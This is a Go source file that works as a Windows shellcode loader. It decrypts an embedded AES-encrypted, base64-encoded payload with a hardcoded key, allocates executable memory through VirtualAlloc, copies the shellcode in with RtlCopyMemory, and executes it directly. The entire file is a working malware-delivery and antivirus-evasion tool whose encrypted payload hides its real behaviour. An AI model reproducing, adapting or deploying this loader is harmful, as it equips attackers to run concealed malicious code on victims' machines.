package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"github.com/ha1yu/tingchao-server/utils"
	"log"
	"unsafe"

	//"github.com/ha1yu/tingchao-server/utils"
	"syscall"
)

var iv = "0000000000000000"

func PKCS5UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}
func AesDecrypt(decodeStr string, key []byte) ([]byte, error) {
	decodeBytes, err := base64.StdEncoding.DecodeString(decodeStr)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode := cipher.NewCBCDecrypter(block, []byte(iv))
	origData := make([]byte, len(decodeBytes))

	blockMode.CryptBlocks(origData, decodeBytes)
	origData = PKCS5UnPadding(origData)
	return origData, nil
}

func CError(err error) {
	if err != nil {
		fmt.Println(err)
		return
	}
	return
}

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	KEY_1                  = 90
	KEY_2                  = 91
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func main() {

	utils.Gotest01()
	shellcodeAesBast64 := "OPQI9JGoMh9g/LTZ9ShH2jXalCpYJxoViYIYgOLN7jUlyqxZK1yGb/tm8dSfkpfAoGmc7Btms/519YS5CquBCebtM76wUS8ahc6hL2lQsxLJnZvIDCnply6UEzv4uaD6lmJapOFSaiTrftm4euGllupnGdqevihQPM34U6Q5tGul0u5O0NVu6iAw+UXAgCFTlGFG68mS4L/moRbHOHkoLccG3t41dyQRQ0xKX+oEO/w6v28I9cIFb26hrj3T5pAST8ZYvNjfLLFhYanGnKZbv9vFSA79iP8asxRVMUS/qdO+Wbnq72CMmDjjCghpeblA8XVRmExNUm4YN7Q9GOp5BMCFkXRERMWoBZks6rZIJKph/Ll089kMCvNmuCkKbmXfQ2nrUUcngeGOqMZ7/4lrxex0xnlzTV+t0upALOISlnSo0QIFJDauXoOcMEM2Uf5UYp75SrOfi3254SsAT74r2ytAxf/gmmTSxG8EPLh1foqiF2TxJHI8DvG6VWrgn25oedUqiz3v3HZc52RcGSpU7fYVQ7NuaevdE9CfKxkQVJoq1xfZtv49OgixIRrz8EPg9J0FJBZyyvtnWTgoUZ+PRkgvB3+bNI1dxlO4kC2GpRpFUZZ6+he3VqPKCdPEKD5VPso3+BjGSUv+c1WfgfuyVz+6A7U7taEiFsYQKMcLKgm51DUvBpM9gG1d/85/a+XcCpqzVM8qcJXSc8WNmcdP+LSIsrbD4MUr7EK6xTscUPO2B9rOXkQ9s2mw3WrH1JBNX1deW/RDmH8l8MxcaHy7Vh88wW3X8+kzv/1wAqDsQ9GE0O0HNzzLFUfenAGBCVIEebdZwRWFc8VRourg1O0kCtNN6BSOMIOc2CBLU/dNfqLMchEDPCqUpL/PRfVzEl84GH6KHaTYaQd2ALoIEfyHzaXgI2r9CCJiy+v8C+SijbwIAUoMsyRZh66xtRLmhsMbDOYPcSByj8c/r0zKedY74ueWOAQEIpQ1Aku3JOBnUWZzDYV1cJjY5Naf45oFb+CjJcEnp8ud3rr60WReyPye26h474BdhsXW7aim8KA4dTf2nh8nc04A5diybtdy3ADR9jUh6oSNLaATOKrcDM9KnwHPFFZZRtPgmii+RScmw18tqHUsCZrsZHUW1EvuRnxZunO36uItJnBf3PhGbhU6eNVaXR3lacjzUEz1k411GdBwVqbkSWBBHC0/m80/k5G0wKx962EHGjVWBOS770N/pQ=="

	shellcode, _ := AesDecrypt(shellcodeAesBast64, []byte("woshikeywoshikey"))
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		log.Println(err)
		//syscall.Exit(0)
	}
	//if err != nil && err.Error() != "The operation completed successfully." {
	//	syscall.Exit(0)
	//}
	log.Println(456)
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	//if err != nil && err.Error() != "The operation completed successfully." {
	//	syscall.Exit(0)
	//}
	if err != nil {
		log.Println(err)
		//syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}
